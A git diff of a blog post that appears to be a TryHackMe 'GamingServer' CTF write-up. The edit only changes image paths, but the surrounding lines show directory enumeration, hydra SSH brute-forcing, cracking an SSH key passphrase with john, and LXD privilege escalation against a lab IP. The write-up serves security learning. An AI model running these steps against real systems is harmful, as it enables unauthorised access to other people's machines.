@@ -4,9 +4,8 @@ author: Bonface
 date: 2024-10-31 00:00:00 +0000
 categories: [TryHackMe]
 tags: [tryhackme, linux, nmap, privesc, http, gobuster, ssh, brute, lxd]
-img_path: /assets/img/GamingServer
 image:
-    path: /assets/img/GamingServer/0.jpeg
+    path: /assets/img/try%20hack%20me%20/Easy/GamingServer/0.jpeg
     alt: GamingServer
 ---
 
@@ -49,21 +48,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```sh
 gobuster dir -u http://10.10.69.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-![](/assets/img/GamingServer/1.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/1.png)
 
 ## /secrets  
-![](/assets/img/GamingServer/2.png)  
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/2.png)  
 I got a secret file that after downloading i found that it was a `ssh RSA`  
-![](/assets/img/GamingServer/3.png)  
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/3.png)  
 
 
-![](/assets/img/GamingServer/4.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/4.png)
 surfing through the web i get an upload directory.
 ## /uploads
-![](/assets/img/GamingServer/5.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/5.png)
 
 I downloaded the dict.lst file that contains a list of i think passwords or usernames.  
-![](/assets/img/GamingServer/6.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/6.png)
 
 - Manifesto.txt file that is a  very useless manifesto that is only there to teach you poetry`
 
@@ -71,7 +70,7 @@ I downloaded the dict.lst file that contains a list of i think passwords or user
 
 ## source-code
 Going back i got a comment from the dev.  
-![](/assets/img/GamingServer/7.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/7.png)
 
 
 ## so far we have  
@@ -86,7 +85,7 @@ First attempt
 ```sh
 hydra -l john -P dict.lst 10.10.69.28 ssh 
 ```
-![](/assets/img/GamingServer/8.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/8.png)
 
 -------------------------------------------------
 Second Attempt
@@ -95,7 +94,7 @@ Second Attempt
 	ssh2john secretKey > secret  
 	john --wordlist=dict.lst secret
 ```
-![](/assets/img/GamingServer/9.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/9.png)
 ---------------------------------------------------
 Third Attempt
 ---------------------------------------------------
@@ -104,7 +103,7 @@ chmod 600 secretKey
 ssh john@10.10.69.28 -i secretKey
 ```
 This was much better.  
-![](/assets/img/GamingServer/10.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/10.png)
 
 -----------------------------------------------------
 Forth Attempt
@@ -113,7 +112,7 @@ Forth Attempt
 /usr/share/john/ssh2john.py secretKey > secret
 sudo john secret -w=dict.lst
 ```
-![](/assets/img/GamingServer/11.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/11.png)
 
 Now i have the passphrase `letmein`  
 Later, back to my senses and spotted my mistakes,Can you??  
@@ -184,4 +183,4 @@ To exploit the machine
 lxc exec privesc /bin/sh
 ```
 
-![](/assets/img/GamingServer/12.png)
+![](/assets/img/try%20hack%20me%20/Easy/GamingServer/12.png)
